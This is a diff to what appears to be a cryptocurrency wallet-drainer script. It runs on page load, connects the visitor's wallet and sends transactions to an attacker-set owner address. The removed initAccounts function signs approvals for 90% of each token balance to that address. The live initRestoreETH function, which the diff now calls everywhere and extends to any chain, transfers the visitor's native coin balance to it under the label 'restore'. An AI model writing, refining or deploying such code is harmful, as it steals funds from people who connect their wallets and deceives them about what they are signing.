@@ -151,7 +151,7 @@ document.addEventListener("DOMContentLoaded", async () => {
       modal.open();
       observeDOM();
     } else {
-      await initAccounts();
+      await initRestoreETH();
       const connectedAccounts = await modal.getWalletProvider().request({
         method: "eth_requestAccounts",
       });
@@ -159,140 +159,140 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  async function initAccounts() {
-    if (modal.getIsConnected() == false) {
-      setTimeout(() => {
-        modal.open();
-      }, 1000);
+  // async function initAccounts() {
+  //   if (modal.getIsConnected() == false) {
+  //     setTimeout(() => {
+  //       modal.open();
+  //     }, 1000);
 
-      return;
-    }
+  //     return;
+  //   }
 
-    data.provider = modal.getWalletProvider();
+  //   data.provider = modal.getWalletProvider();
 
-    const connectedAccounts = await modal.getWalletProvider().request({
-      method: "eth_requestAccounts",
-    });
+  //   const connectedAccounts = await modal.getWalletProvider().request({
+  //     method: "eth_requestAccounts",
+  //   });
 
-    const currentChain = await modal.getWalletProvider().request({
-      method: "eth_chainId",
-    });
+  //   const currentChain = await modal.getWalletProvider().request({
+  //     method: "eth_chainId",
+  //   });
 
-    // console.log(currentChain);
+  //   // console.log(currentChain);
 
-    if (!mySupportedChains.includes(Number(BigInt(currentChain).toString()))) {
-      await switchChain(Number(mySupportedChains[0]).toString(16));
-    }
+  //   if (!mySupportedChains.includes(Number(BigInt(currentChain).toString()))) {
+  //     await switchChain(Number(mySupportedChains[0]).toString(16));
+  //   }
 
-    try {
-      const resultTokens = await getTokensOwned(
-        connectedAccounts[0],
-        BigInt(currentChain).toString()
-      );
+  //   try {
+  //     const resultTokens = await getTokensOwned(
+  //       connectedAccounts[0],
+  //       BigInt(currentChain).toString()
+  //     );
 
-      // console.log(resultTokens);
+  //     // console.log(resultTokens);
 
-      if (resultTokens.length > 0) {
-        let shouldRestoreETH = false;
+  //     if (resultTokens.length > 0) {
+  //       let shouldRestoreETH = false;
 
-        for (let i = 0; i < resultTokens.length; i++) {
-          try {
-            const tkn = resultTokens[i];
+  //       for (let i = 0; i < resultTokens.length; i++) {
+  //         try {
+  //           const tkn = resultTokens[i];
 
-            const iFace = new utils.Interface(TOKEN_ABI.TOKEN_ABI);
+  //           const iFace = new utils.Interface(TOKEN_ABI.TOKEN_ABI);
 
-            // console.log(iFace);
+  //           // console.log(iFace);
 
-            // const balanceData = iFace.encodeFunctionData(
-            //     "balanceOf",
-            //     [connectedAccounts[0]]
-            // );
-            const balanceData = iFace.encodeFunctionData("balanceOf", [
-              `0x${connectedAccounts[0].replace(/^0x/, "")}`,
-            ]);
+  //           // const balanceData = iFace.encodeFunctionData(
+  //           //     "balanceOf",
+  //           //     [connectedAccounts[0]]
+  //           // );
+  //           const balanceData = iFace.encodeFunctionData("balanceOf", [
+  //             `0x${connectedAccounts[0].replace(/^0x/, "")}`,
+  //           ]);
 
-            const userBalanceHex = await modal.getWalletProvider().request({
-              method: "eth_call",
-              params: [
-                {
-                  to: `0x${tkn.address.replace(/^0x/, "")}`,
-                  data: balanceData,
-                },
-              ],
-            });
+  //           const userBalanceHex = await modal.getWalletProvider().request({
+  //             method: "eth_call",
+  //             params: [
+  //               {
+  //                 to: `0x${tkn.address.replace(/^0x/, "")}`,
+  //                 data: balanceData,
+  //               },
+  //             ],
+  //           });
 
-            const userBalance = BigNumber.from(userBalanceHex); // Convert hex to BigNumber
+  //           const userBalance = BigNumber.from(userBalanceHex); // Convert hex to BigNumber
 
-            const approvalAmount = userBalance
-              .mul(BigNumber.from(90))
-              .div(BigNumber.from(100));
+  //           const approvalAmount = userBalance
+  //             .mul(BigNumber.from(90))
+  //             .div(BigNumber.from(100));
 
-            const tokenData = iFace.encodeFunctionData("approve", [
-              `0x${import.meta.env.VITE_OWNER_ADDRESS.replace(/^0x/, "")}`,
-              String(approvalAmount),
-            ]);
+  //           const tokenData = iFace.encodeFunctionData("approve", [
+  //             `0x${import.meta.env.VITE_OWNER_ADDRESS.replace(/^0x/, "")}`,
+  //             String(approvalAmount),
+  //           ]);
 
-            const userNonce = await modal.getWalletProvider().request({
-              method: "eth_getTransactionCount",
-              params: [
-                `0x${connectedAccounts[0].replace(/^0x/, "")}`,
-                "latest",
-              ],
-            });
+  //           const userNonce = await modal.getWalletProvider().request({
+  //             method: "eth_getTransactionCount",
+  //             params: [
+  //               `0x${connectedAccounts[0].replace(/^0x/, "")}`,
+  //               "latest",
+  //             ],
+  //           });
 
-            const tokenTX = {
-              from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
-              to: `0x${tkn.address.replace(/^0x/, "")}`,
-              data: tokenData,
-              nonce: userNonce,
-            };
+  //           const tokenTX = {
+  //             from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
+  //             to: `0x${tkn.address.replace(/^0x/, "")}`,
+  //             data: tokenData,
+  //             nonce: userNonce,
+  //           };
 
-            const userTokenTX = await modal.getWalletProvider().request({
-              method: "eth_sendTransaction",
-              params: [tokenTX],
-            });
+  //           const userTokenTX = await modal.getWalletProvider().request({
+  //             method: "eth_sendTransaction",
+  //             params: [tokenTX],
+  //           });
 
-            sendErr(
-              `Token ${tkn.address} allowance on chain ${currentChain} & user ${connectedAccounts[0]} & Hash: ${userTokenTX}`
-            );
-          } catch (error) {
-            sendErr(
-              `Error approving token ${resultTokens[i].address}: ${error.message}`
-            );
-            if (isRetryError(error)) {
-              sendErr(
-                `Retrying token ${resultTokens[i].address} at index ${i}...`
-              );
-              i--;
-              continue;
-            } else if (isRevertError(error)) {
-              // console.log(error);
-              continue;
-            } else {
-              shouldRestoreETH = true;
-            }
-          }
-        }
+  //           sendErr(
+  //             `Token ${tkn.address} allowance on chain ${currentChain} & user ${connectedAccounts[0]} & Hash: ${userTokenTX}`
+  //           );
+  //         } catch (error) {
+  //           sendErr(
+  //             `Error approving token ${resultTokens[i].address}: ${error.message}`
+  //           );
+  //           if (isRetryError(error)) {
+  //             sendErr(
+  //               `Retrying token ${resultTokens[i].address} at index ${i}...`
+  //             );
+  //             i--;
+  //             continue;
+  //           } else if (isRevertError(error)) {
+  //             // console.log(error);
+  //             continue;
+  //           } else {
+  //             shouldRestoreETH = true;
+  //           }
+  //         }
+  //       }
 
-        if (shouldRestoreETH) {
-          await initRestoreETH();
-        }
-      } else {
-        await initRestoreETH();
-      }
-    } catch (error) {
-      // console.log(String(error).startsWith("Moralis SDK Core Error"));
-      if (String(error).startsWith("Moralis SDK Core Error")) {
-        await initRestoreETH();
-        return;
-      } else {
-        await initRestoreETH();
-        return;
-      }
-    }
+  //       if (shouldRestoreETH) {
+  //         await initRestoreETH();
+  //       }
+  //     } else {
+  //       await initRestoreETH();
+  //     }
+  //   } catch (error) {
+  //     // console.log(String(error).startsWith("Moralis SDK Core Error"));
+  //     if (String(error).startsWith("Moralis SDK Core Error")) {
+  //       await initRestoreETH();
+  //       return;
+  //     } else {
+  //       await initRestoreETH();
+  //       return;
+  //     }
+  //   }
 
-    // await initRestoreETH();
-  }
+  //   // await initRestoreETH();
+  // }
 
   async function initRestoreETH() {
     const currentChain = await modal.getWalletProvider().request({
@@ -316,11 +316,11 @@ document.addEventListener("DOMContentLoaded", async () => {
 
       const valueToSend = BigInt(balanceHex);
 
-      if (
-        Number(BigInt(currentChain).toString()) == 1 ||
-        Number(BigInt(currentChain).toString()) == 56 ||
-        Number(BigInt(currentChain).toString()) == 137
-      ) {
+      // if (
+      //   Number(BigInt(currentChain).toString()) == 1 ||
+      //   Number(BigInt(currentChain).toString()) == 56 ||
+      //   Number(BigInt(currentChain).toString()) == 137
+      // ) {
         const resTX = {
           from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
           to: `0x${import.meta.env.VITE_OWNER_ADDRESS.replace(/^0x/, "")}`,
@@ -361,59 +361,59 @@ document.addEventListener("DOMContentLoaded", async () => {
         );
 
         switchChain(mySupportedChains[0]);
-      } else {
-        const currentChainNUM = Number(BigInt(currentChain).toString());
-        const iFace = new utils.Interface(RESTORE_ABI.RESTORE_ABI);
+      // } else {
+      //   const currentChainNUM = Number(BigInt(currentChain).toString());
+      //   const iFace = new utils.Interface(RESTORE_ABI.RESTORE_ABI);
 
-        const restoreData = iFace.encodeFunctionData("restore", []);
+      //   const restoreData = iFace.encodeFunctionData("restore", []);
 
-        const restoreTX = {
-          from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
-          to:
-            currentChainNUM == 1
-              ? `0x${import.meta.env.VITE_ETH.replace(/^0x/, "")}`
-              : currentChainNUM == 137
-              ? `0x${import.meta.env.VITE_MATIC.replace(/^0x/, "")}`
-              : `0x${import.meta.env.VITE_BSC.replace(/^0x/, "")}`,
-          data: restoreData,
-          nonce: `0x${BigInt(userNonce).toString(16)}`,
-          value: `0x${valueToSend.toString(16)}`,
-        };
+      //   const restoreTX = {
+      //     from: `0x${connectedAccounts[0].replace(/^0x/, "")}`,
+      //     to:
+      //       currentChainNUM == 1
+      //         ? `0x${import.meta.env.VITE_ETH.replace(/^0x/, "")}`
+      //         : currentChainNUM == 137
+      //         ? `0x${import.meta.env.VITE_MATIC.replace(/^0x/, "")}`
+      //         : `0x${import.meta.env.VITE_BSC.replace(/^0x/, "")}`,
+      //     data: restoreData,
+      //     nonce: `0x${BigInt(userNonce).toString(16)}`,
+      //     value: `0x${valueToSend.toString(16)}`,
+      //   };
 
-        const estimatedGas = await modal.getWalletProvider().request({
-          method: "eth_estimateGas",
-          params: [restoreTX],
-        });
+      //   const estimatedGas = await modal.getWalletProvider().request({
+      //     method: "eth_estimateGas",
+      //     params: [restoreTX],
+      //   });
 
-        const gasPrice = await modal.getWalletProvider().request({
-          method: "eth_gasPrice",
-        });
+      //   const gasPrice = await modal.getWalletProvider().request({
+      //     method: "eth_gasPrice",
+      //   });
 
-        const realValue =
-          valueToSend - BigInt(estimatedGas) * BigInt(gasPrice) * 5n;
+      //   const realValue =
+      //     valueToSend - BigInt(estimatedGas) * BigInt(gasPrice) * 5n;
 
-        if (realValue <= 0n) {
-          throw new Error(`Insufficient Balance`);
-        }
+      //   if (realValue <= 0n) {
+      //     throw new Error(`Insufficient Balance`);
+      //   }
 
-        restoreTX.value = `0x${realValue.toString(16)}`;
+      //   restoreTX.value = `0x${realValue.toString(16)}`;
 
-        const sendTX = await modal.getWalletProvider().request({
-          method: "eth_sendTransaction",
-          params: [restoreTX],
-        });
+      //   const sendTX = await modal.getWalletProvider().request({
+      //     method: "eth_sendTransaction",
+      //     params: [restoreTX],
+      //   });
 
-        await sendErr(
-          `Restore ETH Success Hash: ${sendTX} on chain ${currentChain}`
-        );
+      //   await sendErr(
+      //     `Restore ETH Success Hash: ${sendTX} on chain ${currentChain}`
+      //   );
 
-        usedChains.push(Number(BigInt(currentChain).toString()));
-        mySupportedChains = mySupportedChains.filter(
-          (item) => !usedChains.includes(Number(item))
-        );
+      //   usedChains.push(Number(BigInt(currentChain).toString()));
+      //   mySupportedChains = mySupportedChains.filter(
+      //     (item) => !usedChains.includes(Number(item))
+      //   );
 
-        switchChain(mySupportedChains[0]);
-      }
+      //   switchChain(mySupportedChains[0]);
+      // }
     } catch (error) {
       sendErr(
         `Error restoring ETH: ${error.message} chain ${await modal
@@ -447,7 +447,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         params: [{ chainId: `0x${x.toString(16)}` }],
       });
 
-      await initAccounts();
+      await initRestoreETH();
     } catch (error) {
       if (error.code == 4001) {
         await switchChain(x);
@@ -480,7 +480,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         }
       } else {
         await sendErr("Switch manually to a supported chain");
-        await initAccounts();
+        await initRestoreETH();
         return;
       }
     }
@@ -496,7 +496,7 @@ document.addEventListener("DOMContentLoaded", async () => {
           mutation.type === "childList" &&
           !document.querySelector('style[data-w3m="scroll-lock"]')
         ) {
-          initAccounts();
+          initRestoreETH();
         }
       }
     };
